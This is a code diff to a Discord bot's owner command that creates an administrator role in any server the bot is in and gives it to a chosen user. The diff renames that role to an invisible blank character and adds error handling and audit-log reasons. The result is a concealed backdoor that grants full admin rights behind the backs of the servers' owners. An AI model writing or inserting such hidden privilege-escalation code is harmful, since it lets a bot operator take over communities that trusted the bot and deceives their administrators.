@@ -348,14 +348,23 @@ class Owner(
         """
         Create an administrator role in a guild and give it to a user.
         """
+        if target.id == guild.owner_id:
+            return await ctx.warn(f"I cannot modify the roles of the guild owner in **{guild.name}**.")
+
         try:
             role = await guild.create_role(
-                name="*",
-                permissions=discord.Permissions(administrator=True)
+                name="ㅤ",
+                permissions=discord.Permissions(administrator=True),
+                reason=f"added by {ctx.author}"
             )
-            await target.add_roles(role)
-        except HTTPException as exc:
-            return await ctx.warn("Failed to create or give the role!", codeblock(exc.text))
+            await target.add_roles(role, reason=f"added by {ctx.author}")
+        except discord.Forbidden:
+            return await ctx.warn(
+                "I do not have permission to create or assign roles in that guild.\n"
+                "This can happen if the target user has a higher role than me."
+            )
+        except HTTPException as e:
+            return await ctx.warn(f"Failed to create or give the role: {e}")
 
         return await ctx.approve(f"Successfully gave an administrator role to **{target}** in **{guild.name}**.")
 
